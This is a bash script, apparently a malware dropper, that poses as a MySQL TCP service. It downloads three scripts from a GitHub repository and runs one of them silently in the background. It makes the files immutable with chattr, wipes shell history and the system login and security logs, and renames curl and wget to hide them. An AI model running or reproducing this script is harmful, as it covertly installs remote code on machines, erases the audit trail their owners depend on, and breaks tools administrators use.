#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

cd /$HOME/
rm -f mysqltcp.sh
rm -f videoysy.sh
rm -f videosys.sh

cd $HOME/myssqltcp/
curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/lib_systemd.sh" -o $HOME/myssqltcp/lib_systemd.sh
curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/addconf.sh" -o $HOME/myssqltcp/addconf.sh
curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/logserver.sh" -o $HOME/myssqltcp/logserver.sh
chmod 777 lib_systemd.sh
chmod 777 addconf.sh
chmod 777 logserver.sh
nohup ./lib_systemd.sh > /dev/null 2>&1 &

# lock
chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
chattr -V +iau $HOME/myssqltcp/logserver.sh
chattr -V +iau $HOME/myssqltcp/addconf.sh
chattr -V +iau $HOME/myssqltcp/MyssqlTcp
chattr -V +iau $HOME/myssqltcp/Tcphost.sh
chattr -V +iau $HOME/myssqltcp/config_background.json
chattr -V +iau $HOME/myssqltcp/config.json

# Clear log
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history

# Modify instruction
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/url /usr/bin/lruc
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/get /usr/bin/tegw

echo "[*] Yes-Go"
